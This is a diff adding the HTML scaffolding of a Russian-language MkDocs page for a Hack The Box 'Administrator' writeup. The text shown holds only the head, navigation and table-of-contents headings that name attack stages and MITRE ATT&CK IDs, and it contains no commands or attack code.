@@ -1,0 +1,1523 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://bdk44.github.io/windows/administrator/">
+      
+      
+        <link rel="prev" href="../..">
+      
+      
+        <link rel="next" href="../../linux/cherryblossom/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../bdk_favicon.webp">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>HTB: Administrator (Medium) - .bdk writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title=".bdk writeups" class="md-header__button md-logo" aria-label=".bdk writeups" data-md-component="logo">
+      
+  <img src="../../wr_logo.webp" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            .bdk writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              HTB: Administrator (Medium)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Переключить на тёмную тему" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Переключить на тёмную тему" for="__palette_1" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Переключить на светлую тему" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Переключить на светлую тему" for="__palette_0" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9z"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title=".bdk writeups" class="md-nav__button md-logo" aria-label=".bdk writeups" data-md-component="logo">
+      
+  <img src="../../wr_logo.webp" alt="logo">
+
+    </a>
+    .bdk writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏡 Главная
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📑 Райтапы
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📑 Райтапы
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🪟 Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🪟 Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"></path></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB: Administrator (Medium)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"></path></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB: Administrator (Medium)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Оглавление">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Оглавление
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Резюме
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Цепочка атаки
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MITRE ATT&amp;CK Mapping
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1046-t1087002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Разведка — T1046, T1087.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1098-t1005-t1110002-t1552001" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Компрометация новых учетных записей и первый флаг — T1098, T1005, T1110.002, T1552.001
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1558003-t1110002-t1003006-t1550002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Компрометация домена и второй флаг — T1558.003, T1110.002, T1003.006, T1550.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Извлеченные уроки
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Источники
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2">
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🐧 Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🐧 Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/cherryblossom/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.5 4.5 0 0 0-1.68-.69 5.22 5.22 0 0 1 5.096-4.104 5.22 5.22 0 0 1 5.174 4.57 5 5 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.25 3.25 0 0 1 1.912-.616 3.28 3.28 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.53 4.53 0 0 0-4.428-3.61 4.5 4.5 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0m5.192 10.64a.9.9 0 0 0-.462.108.9.9 0 0 0-.313.29 1.3 1.3 0 0 0-.175.427 2.4 2.4 0 0 0-.054.514q0 .271.054.517.055.246.175.43a.9.9 0 0 0 .313.297q.19.11.462.11.27 0 .46-.11a.9.9 0 0 0 .309-.296q.12-.185.173-.431.054-.246.054-.517 0-.27-.054-.514a1.3 1.3 0 0 0-.173-.426.9.9 0 0 0-.309-.291.9.9 0 0 0-.46-.108m6.486 0a.9.9 0 0 0-.462.108.9.9 0 0 0-.313.29 1.3 1.3 0 0 0-.175.427 2.4 2.4 0 0 0-.053.514q0 .271.053.517.055.246.175.43a.9.9 0 0 0 .313.297q.19.11.462.11.27 0 .46-.11a.9.9 0 0 0 .31-.296q.117-.185.172-.431t.054-.517q0-.27-.054-.514a1.3 1.3 0 0 0-.173-.426.9.9 0 0 0-.308-.291.9.9 0 0 0-.461-.108m-8.537.068-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445q.119 0 .193.084.074.085.114.21.039.125.054.269a2.5 2.5 0 0 1 0 .533q-.015.145-.054.27a.6.6 0 0 1-.114.21.24.24 0 0 1-.193.085.25.25 0 0 1-.195-.086.6.6 0 0 1-.118-.209 1.3 1.3 0 0 1-.056-.27 2.7 2.7 0 0 1 0-.533q.015-.144.056-.27a.6.6 0 0 1 .118-.209.25.25 0 0 1 .195-.084m6.486 0q.12 0 .193.084.074.085.114.21t.054.269a2.5 2.5 0 0 1 0 .533q-.014.145-.054.27a.6.6 0 0 1-.114.21.24.24 0 0 1-.193.085.25.25 0 0 1-.195-.086.6.6 0 0 1-.117-.209 1.3 1.3 0 0 1-.056-.27 2.6 2.6 0 0 1 0-.533q.014-.144.056-.27a.6.6 0 0 1 .117-.209.25.25 0 0 1 .195-.084m-2.191 3.51a.93.93 0 0 0-.463.109.9.9 0 0 0-.312.291q-.12.182-.175.426a2.4 2.4 0 0 0-.054.514q0 .27.054.516t.175.432a.9.9 0 0 0 .312.296.9.9 0 0 0 .463.11q.27 0 .46-.11a.9.9 0 0 0 .308-.296 1.3 1.3 0 0 0 .174-.432q.054-.245.054-.516 0-.27-.054-.514a1.3 1.3 0 0 0-.174-.426.9.9 0 0 0-.309-.291.9.9 0 0 0-.46-.108zm-6.402.07-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443q.12 0 .194.085a.6.6 0 0 1 .114.21q.04.124.053.269a2.6 2.6 0 0 1 0 .532 1.3 1.3 0 0 1-.053.27.6.6 0 0 1-.114.21.24.24 0 0 1-.193.085.25.25 0 0 1-.196-.085.6.6 0 0 1-.117-.21 1.3 1.3 0 0 1-.056-.27 2.6 2.6 0 0 1 0-.532q.014-.145.056-.27a.6.6 0 0 1 .117-.209.25.25 0 0 1 .196-.085zm-6.729 3.073a.7.7 0 0 0-.335.078.66.66 0 0 0-.227.211.9.9 0 0 0-.127.31q-.04.177-.04.373c0 .196.013.256.04.375a.9.9 0 0 0 .127.313.65.65 0 0 0 .227.215q.138.08.335.08a.66.66 0 0 0 .334-.08.65.65 0 0 0 .225-.215q.086-.135.125-.313a1.8 1.8 0 0 0 .04-.375q0-.195-.04-.373a.9.9 0 0 0-.125-.31.66.66 0 0 0-.225-.21.67.67 0 0 0-.334-.08zm3.086 0a.7.7 0 0 0-.336.078.66.66 0 0 0-.226.211.9.9 0 0 0-.127.31 1.7 1.7 0 0 0-.04.373q0 .197.04.375a.9.9 0 0 0 .127.313q.088.135.226.215.14.08.336.08a.66.66 0 0 0 .334-.08.65.65 0 0 0 .224-.215q.087-.135.126-.313a1.75 1.75 0 0 0 0-.748 1 1 0 0 0-.126-.31.66.66 0 0 0-.224-.21.67.67 0 0 0-.334-.08zm5.108 0a.7.7 0 0 0-.336.078.66.66 0 0 0-.226.211.9.9 0 0 0-.127.31q-.04.177-.04.373c0 .196.013.256.04.375a.9.9 0 0 0 .127.313q.087.135.226.215.14.08.336.08t.334-.08a.65.65 0 0 0 .224-.215q.087-.135.126-.313a1.8 1.8 0 0 0 .04-.375q0-.195-.04-.373a1 1 0 0 0-.126-.31.66.66 0 0 0-.224-.21.67.67 0 0 0-.334-.08zm-6.658.05-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322q.087 0 .14.062a.4.4 0 0 1 .083.151 1 1 0 0 1 .04.196 2 2 0 0 1 0 .386 1 1 0 0 1-.04.197.4.4 0 0 1-.083.152.18.18 0 0 1-.14.061.18.18 0 0 1-.141-.06.4.4 0 0 1-.085-.153 1 1 0 0 1-.041-.197 2 2 0 0 1 0-.386 1 1 0 0 1 .04-.196.4.4 0 0 1 .086-.151.18.18 0 0 1 .141-.062m3.086 0q.086 0 .14.062a.4.4 0 0 1 .082.151 1 1 0 0 1 .04.196 2 2 0 0 1 0 .386 1 1 0 0 1-.04.197.4.4 0 0 1-.082.152.18.18 0 0 1-.14.061.18.18 0 0 1-.141-.06.4.4 0 0 1-.086-.153 1 1 0 0 1-.04-.197 2 2 0 0 1-.011-.195q0-.086.01-.191a1 1 0 0 1 .041-.196.4.4 0 0 1 .086-.151.18.18 0 0 1 .141-.062m5.108 0q.087 0 .14.062a.4.4 0 0 1 .082.151 1 1 0 0 1 .04.196 2 2 0 0 1 0 .386 1 1 0 0 1-.04.197.4.4 0 0 1-.082.152.18.18 0 0 1-.14.061.18.18 0 0 1-.142-.06.4.4 0 0 1-.085-.153 1 1 0 0 1-.04-.197 2 2 0 0 1-.011-.195q0-.086.01-.191a1 1 0 0 1 .04-.196.5.5 0 0 1 .086-.151.18.18 0 0 1 .142-.062m-1.684 1.814a.7.7 0 0 0-.336.079.66.66 0 0 0-.227.21.9.9 0 0 0-.127.31 1.7 1.7 0 0 0 0 .748 1 1 0 0 0 .127.314q.088.135.227.215.14.08.336.08a.66.66 0 0 0 .334-.08.65.65 0 0 0 .224-.215q.087-.135.126-.314a1.7 1.7 0 0 0-.001-.747.9.9 0 0 0-.125-.31.65.65 0 0 0-.224-.211.67.67 0 0 0-.334-.079m3.063 0a.7.7 0 0 0-.336.079.7.7 0 0 0-.227.21.9.9 0 0 0-.127.31 1.7 1.7 0 0 0 0 .748.9.9 0 0 0 .127.314.66.66 0 0 0 .227.215q.138.08.336.08a.65.65 0 0 0 .334-.08.65.65 0 0 0 .223-.215q.087-.135.126-.314a1.7 1.7 0 0 0 0-.747.9.9 0 0 0-.126-.31.65.65 0 0 0-.223-.211.67.67 0 0 0-.334-.079m-1.545.05-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323q.086 0 .14.061a.4.4 0 0 1 .082.152 1 1 0 0 1 .04.195 2 2 0 0 1 0 .387 1 1 0 0 1-.04.197.4.4 0 0 1-.082.152.18.18 0 0 1-.14.06.18.18 0 0 1-.142-.06.4.4 0 0 1-.085-.152 1 1 0 0 1-.04-.197 2 2 0 0 1-.011-.195q0-.087.01-.192a1 1 0 0 1 .041-.195q.03-.09.085-.152a.18.18 0 0 1 .142-.061m3.063 0q.086 0 .14.061a.4.4 0 0 1 .082.152 1 1 0 0 1 .04.195 2 2 0 0 1 0 .387 1 1 0 0 1-.04.197.4.4 0 0 1-.083.152.18.18 0 0 1-.14.06.18.18 0 0 1-.141-.06.4.4 0 0 1-.085-.152 1 1 0 0 1-.04-.197 2 2 0 0 1 0-.387 1 1 0 0 1 .04-.195q.03-.09.085-.152a.18.18 0 0 1 .142-.061m-9.713.185a.47.47 0 0 0-.232.055.46.46 0 0 0-.157.146.6.6 0 0 0-.089.215 1.2 1.2 0 0 0-.027.259q0 .135.027.26a.7.7 0 0 0 .089.216q.06.094.157.149a.46.46 0 0 0 .232.056q.136-.001.231-.056a.45.45 0 0 0 .156-.149.7.7 0 0 0 .087-.217 1.2 1.2 0 0 0 0-.518.7.7 0 0 0-.087-.215.45.45 0 0 0-.156-.146.46.46 0 0 0-.23-.055zm1.052.035-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224q.06 0 .097.042a.3.3 0 0 1 .057.105.7.7 0 0 1 .028.136q.006.073.007.133 0 .06-.007.135a.7.7 0 0 1-.028.136.3.3 0 0 1-.057.105.12.12 0 0 1-.097.043.13.13 0 0 1-.098-.043.3.3 0 0 1-.059-.105.6.6 0 0 1-.028-.136 1.4 1.4 0 0 1 0-.268.6.6 0 0 1 .028-.136.3.3 0 0 1 .06-.105.13.13 0 0 1 .097-.042m3.775 1.394a.46.46 0 0 0-.232.054.45.45 0 0 0-.157.146.6.6 0 0 0-.088.214 1.2 1.2 0 0 0 0 .519.6.6 0 0 0 .088.217.46.46 0 0 0 .157.15.46.46 0 0 0 .232.054.45.45 0 0 0 .232-.055.45.45 0 0 0 .155-.149.7.7 0 0 0 .087-.217 1.2 1.2 0 0 0 0-.519.6.6 0 0 0-.087-.214.45.45 0 0 0-.155-.146.46.46 0 0 0-.232-.054m1.052.034-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223q.06 0 .098.043a.3.3 0 0 1 .057.105.6.6 0 0 1 .027.135 1.3 1.3 0 0 1 0 .268.7.7 0 0 1-.027.137.3.3 0 0 1-.057.105.12.12 0 0 1-.098.042.13.13 0 0 1-.098-.042.3.3 0 0 1-.059-.105.6.6 0 0 1-.028-.137 1.4 1.4 0 0 1 0-.268.6.6 0 0 1 .028-.135.3.3 0 0 1 .06-.105.12.12 0 0 1 .097-.043"></path></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    THM: CherryBlossom (Hard)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📓 Заметки
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏷️ Тэги
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Оглавление">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Оглавление
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Резюме
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Цепочка атаки
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
